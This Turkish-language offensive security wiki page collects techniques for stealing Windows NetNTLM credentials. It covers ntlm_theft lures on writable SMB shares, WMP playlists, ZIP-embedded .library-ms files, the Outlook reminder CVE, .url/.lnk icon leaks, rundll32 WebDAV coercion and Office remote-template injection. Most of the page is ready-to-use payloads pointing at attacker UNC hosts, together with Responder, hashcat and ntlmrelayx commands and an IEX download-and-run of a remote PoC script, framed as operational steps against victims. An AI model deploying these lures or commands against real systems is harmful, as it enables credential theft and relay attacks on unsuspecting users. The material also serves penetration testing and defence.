# NTLM kimlik bilgilerini çalabileceğiniz yerler

{{#include ../../banners/hacktricks-training.md}}

**https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ adresindeki, çevrim içi bir microsoft word dosyasının indirilmesinden ntlm leaks kaynağına kadar tüm harika fikirleri inceleyin: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md ve [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Yazılabilir SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Kullanıcıların veya scheduled job'ların Explorer'da göz attığı bir share'a **yazabiliyorsanız**, metadata'sı UNC'nize işaret eden dosyalar bırakın (ör. `\\ATTACKER\share`). Klasörün işlenmesi **implicit SMB authentication**'ı tetikler ve listener'ınıza bir **NetNTLMv2** sızdırır.<sup>[[1]](#references)</sup>

1. **Lure'lar oluşturun** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc. kapsanır)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Bunları yazılabilir paylaşıma bırakın** (kurbanın açtığı herhangi bir klasör):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Dinle ve crack et**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows aynı anda birden fazla dosyaya erişebilir; Explorer'ın önizlediği her şey (`BROWSE TO FOLDER`) tıklama gerektirmez.

### Windows Media Player çalma listeleri (.ASX/.WAX)

Kontrol ettiğiniz bir Windows Media Player çalma listesini hedefe açtırabilir veya önizletebilirseniz, girdiyi bir UNC yoluna yönlendirerek Net-NTLMv2 leak edebilirsiniz. WMP, referans verilen medyayı SMB üzerinden almaya çalışır ve otomatik olarak kimlik doğrulaması yapar.<sup>[[3]](#references)[[4]](#references)</sup>

Örnek payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Toplama ve cracking akışı:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer, ZIP arşivi içinden doğrudan açıldıklarında .library-ms dosyalarını güvenli olmayan biçimde işler. Kütüphane tanımı uzak bir UNC path'e (ör. \\attacker\share) işaret ediyorsa, ZIP içindeki .library-ms dosyasına yalnızca göz atmak/başlatmak bile Explorer'ın UNC'yi enumerate etmesine ve saldırgana NTLM authentication göndermesine neden olur. Bu, offline olarak crack edilebilen veya potansiyel olarak relay edilebilen bir NetNTLMv2 elde edilmesini sağlar.<sup>[[2]](#references)</sup>

Saldırgan UNC'sine işaret eden minimal .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operasyonel adımlar
- Yukarıdaki XML ile .library-ms dosyasını oluşturun (IP/hostname bilginizi ayarlayın).
- Dosyayı ZIP’leyin (Windows’ta: Send to → Compressed (zipped) folder) ve ZIP dosyasını hedefe gönderin.
- Bir NTLM capture listener çalıştırın ve kurbanın ZIP içinden .library-ms dosyasını açmasını bekleyin.


### Outlook takvim hatırlatıcı ses yolu (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook for Windows, takvim öğelerindeki genişletilmiş MAPI özelliği PidLidReminderFileParameter’ı işliyordu. Bu özellik bir UNC path’e (ör. \\attacker\share\alert.wav) işaret ederse Outlook, hatırlatıcı çalıştığında SMB share’e bağlanarak kullanıcının Net-NTLMv2 bilgisini herhangi bir tıklama olmadan leak ediyordu. Bu açık 14 Mart 2023’te patch’lendi, ancak legacy/untouched fleet’ler ve geçmişe dönük incident response için hâlâ oldukça önemlidir.<sup>[[5]](#references)</sup>

PowerShell (Outlook COM) ile hızlı exploitation:
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener tarafı:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notlar
- Bir victim'ın yalnızca reminder tetiklendiğinde Outlook for Windows'u çalışıyor olmalıdır.
- leak, offline cracking veya relay için uygun Net‑NTLMv2 sağlar (pass-the-hash değildir).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054 bypass'i)

Windows Explorer, shortcut icon'larını otomatik olarak render eder. Recent research, Microsoft'un UNC-icon shortcut'ları için Nisan 2025'te yayımladığı patch'ten sonra bile shortcut target'ını bir UNC path üzerinde barındırıp icon'u local tutarak hiçbir tıklama olmadan NTLM authentication tetiklemenin hâlâ mümkün olduğunu gösterdi (patch bypass için CVE‑2025‑50154 atandı). Klasörü yalnızca görüntülemek, Explorer'ın remote target'tan metadata almasına ve attacker'ın SMB server'ına NTLM göndermesine neden olur.<sup>[[6]](#references)</sup>

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload'unu PowerShell ile:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery fikirleri
- Shortcut'ı bir ZIP içine koyun ve kurbanın bu dosyaya göz atmasını sağlayın.
- Shortcut'ı kurbanın açacağı yazılabilir bir share üzerine yerleştirin.
- Explorer'ın öğeleri önizlemesi için aynı klasördeki diğer lure dosyalarıyla birleştirin.

### ExtraData icon path üzerinden no-click .LNK NTLM leak (CVE‑2026‑25185)

Windows, `.lnk` metadata'sını yalnızca çalıştırma sırasında değil, **görüntüleme/önizleme** sırasında da yükler (icon oluşturma). CVE‑2026‑25185, **ExtraData** bloklarının shell'in bir icon path'i çözümlemesine ve **yükleme sırasında** filesystem'e erişmesine neden olduğu bir parsing yolunu gösterir; path remote olduğunda outbound NTLM gönderilir.

Temel tetikleme koşulları (`CShellLink::_LoadFromStream` içinde gözlemlenmiştir):
- ExtraData içine **DARWIN_PROPS** (`0xa0000006`) ekleyin (icon update routine'e geçiş sağlar).
- `TargetUnicode` alanı doldurulmuş şekilde **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) ekleyin.
- Loader, `TargetUnicode` içindeki environment variable'ları genişletir ve elde edilen path üzerinde `PathFileExistsW` çağırır.

`TargetUnicode` bir UNC path'e (ör. `\\attacker\share\icon.ico`) çözülürse, shortcut'ı içeren bir klasörü **sadece görüntülemek** bile outbound authentication başlatır. Aynı load path'ine **indexing** ve **AV scanning** yoluyla da ulaşılabilir; bu da bunu pratik bir no-click leak surface haline getirir.<sup>[[7]](#references)</sup>

Bu yapıları Windows GUI kullanmadan oluşturmak ve incelemek için Research tooling (parser/generator/UI), **LnkMeMaybe** projesinde mevcuttur.<sup>[[8]](#references)</sup>


### `davclnt.dll,DavSetCookie` üzerinden WebDAV auth coercion / credential validation

Yerel **WebDAV client**, mevcut logon session'ını rastgele bir **HTTP/WebDAV** endpoint'ine authenticate olmaya zorlamak için kötüye kullanılabilir:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Neden kullanışlıdır:
- **Saldırganın kontrolündeki bir WebDAV sunucusuna** karşı, özel bir client bırakmadan **HTTP üzerinden NTLM** tetikleyebilir.
- **Dahili hostlara** karşı, lateral movement gerçekleştirmeden önce çalınan kimlik bilgilerinin nerelerde kabul edildiğini **sessizce doğrulamak** için kullanılabilir.<sup>[[9]](#references)</sup>
- **SMB egress** filtrelenmiş ancak **HTTP/WebDAV** erişilebilir durumdaysa komut iyi bir alternatiftir.

Operasyonel notlar:
- Kaynak hostta **WebClient** servisi çalışıyor olmalıdır.
- `rundll32.exe`, `davclnt.dll` dosyasını yükler ve Windows'un WebDAV authentication işlemini **mevcut kullanıcının kimlik bilgilerini** kullanarak gerçekleştirmesini sağlar.<sup>[[10]](#references)</sup>
- Kontrolünüzdeki bir altyapıya yönlendiriyorsanız şu tür NTLM-aware HTTP listener/relay kullanın:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Detection perspective açısından, birçok internal system'e karşı tekrarlanan `rundll32.exe davclnt.dll,DavSetCookie` çalıştırmaları, normal kullanıcı davranışından ziyade **credential validation / spray-like lateral movement prep** için güçlü bir sinyaldir.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) ile NTLM'i zorlamak

Office belgeleri harici bir template'e başvurabilir. Ekli template'i bir UNC path olarak ayarlarsanız, belge açıldığında SMB'ye authenticate olur.

Minimal DOCX relationship değişiklikleri (word/ içinde):

1) word/settings.xml dosyasını düzenleyin ve ekli template referansını ekleyin:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels dosyasını düzenleyin ve rId1337'ü UNC'nize yönlendirin:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx'e yeniden paketleyin ve teslim edin. SMB capture listener'ınızı çalıştırın ve açılmasını bekleyin.

NTLM'i relay etme veya kötüye kullanma fikirleri için şuraya bakın:

{{#ref}}
README.md
{{#endref}}


## Referanslar
- [1] [HTB: Breach – Yazılabilir paylaşım yemleri + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerabilities: Microsoft'ta yamalanmamış privilege escalation tehditleri](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft, Outlook EoP'yi (CVE‑2023‑23397) azaltıyor ve PidLidReminderFileParameter üzerinden NTLM leak'i açıklıyor](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: CVE‑2026‑25185 incelemesi](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – IT Support aradığında: Teams'ten domain compromise'a uzanan bir ModeloRAT campaign'inin incelenmesi](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header'ı](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Netntlm Hash'lerini çalmak için ilgi çekici noktalar](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)


{{#include ../../banners/hacktricks-training.md}}
